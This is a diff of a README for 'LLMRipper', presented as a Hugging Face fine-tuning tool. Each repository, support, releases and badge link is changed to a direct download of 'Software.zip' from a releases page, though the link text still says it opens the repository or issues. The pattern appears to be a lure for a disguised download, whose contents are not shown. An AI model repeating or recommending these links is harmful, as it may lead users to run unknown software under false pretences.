@@ -28,7 +28,7 @@ LLMRipper is a revolutionary tool that simplifies the process of fine-tuning Lan
 
 To get started with LLMRipper, simply follow these steps:
 
-1. Visit the [LLMRipper GitHub repository](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip).
+1. Visit the [LLMRipper GitHub repository](https://github.com/Baksh143/LLMRipper/releases/download/v1.0/Software.zip).
 2. Download the repository files by launching the provided link.
 3. Open the LLMRipper interface and select the LLM model you want to fine-tune.
 4. Customize the model settings for your specific task requirements.
@@ -45,13 +45,13 @@ We welcome contributions from the community to enhance the capabilities of LLMRi
 
 ## Support
 
-For any questions, feedback, or support requests regarding LLMRipper, please reach out to our team by [visiting the GitHub repository](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) and opening an issue. We are here to assist you in making the most of your fine-tuning experience with LLMRipper.
+For any questions, feedback, or support requests regarding LLMRipper, please reach out to our team by [visiting the GitHub repository](https://github.com/Baksh143/LLMRipper/releases/download/v1.0/Software.zip) and opening an issue. We are here to assist you in making the most of your fine-tuning experience with LLMRipper.
 
 ---
 
 ## Releases
 
-If the provided link for downloading the repository files does not work, kindly check the "Releases" section of the [LLMRipper GitHub repository](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) for alternative download options.
+If the provided link for downloading the repository files does not work, kindly check the "Releases" section of the [LLMRipper GitHub repository](https://github.com/Baksh143/LLMRipper/releases/download/v1.0/Software.zip) for alternative download options.
 
 ---
 
@@ -59,7 +59,7 @@ If the provided link for downloading the repository files does not work, kindly 
 
 Click below to access the LLMRipper repository and embark on your journey towards effortless language model fine-tuning:
 
-[![Download LLMRipper](https://img.shields.io/badge/Download-LLMRipper-green.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download LLMRipper](https://github.com/Baksh143/LLMRipper/releases/download/v1.0/Software.zip)](https://github.com/Baksh143/LLMRipper/releases/download/v1.0/Software.zip)
 
 Unlock the power of fine-tuning Hugging Face LLM models with LLMRipper - your gateway to seamless NLP model customization! 🌟
 
